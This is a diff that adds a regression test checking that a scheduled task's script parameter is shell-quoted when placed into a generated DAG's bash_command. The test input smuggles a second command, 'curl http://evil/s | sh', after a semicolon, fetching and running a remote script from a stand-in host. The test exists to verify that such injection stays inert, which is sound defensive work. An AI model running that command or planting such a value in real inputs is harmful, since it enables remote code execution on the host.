@@ -465,3 +465,37 @@ def test_empty_dag_header_is_injection_safe():
         {"id": POC_SQUOTE, "kind": "DataProduct", "fluidVersion": "0.7.5"}
     )
     assert_inert(code)
+
+
+def test_schedule_task_script_is_shell_quoted_not_just_python_inert():
+    """`assert_inert` only proves the value cannot escape the *Python* literal.
+
+    The shell layer is separate: the string inside `bash_command` is handed to
+    a shell at task runtime, so a `;` in `script` must not start a new command.
+    """
+    import ast
+
+    code = _dag_from_actions(
+        [
+            {
+                "actionId": "a1",
+                "action": "scheduleTask",
+                "params": {
+                    "engine": "spark",
+                    "script": "job.py; curl http://evil/s | sh",
+                    "buildId": "b1",
+                },
+            }
+        ]
+    )
+    tree = assert_inert(code)
+    commands = [
+        kw.value.value
+        for node in ast.walk(tree)
+        if isinstance(node, ast.Call)
+        for kw in node.keywords
+        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
+    ]
+    assert commands, "no bash_command found"
+    # shlex.quote wraps the whole value, so the `;` is inside quotes.
+    assert commands[0] == "'job.py; curl http://evil/s | sh'", commands[0]
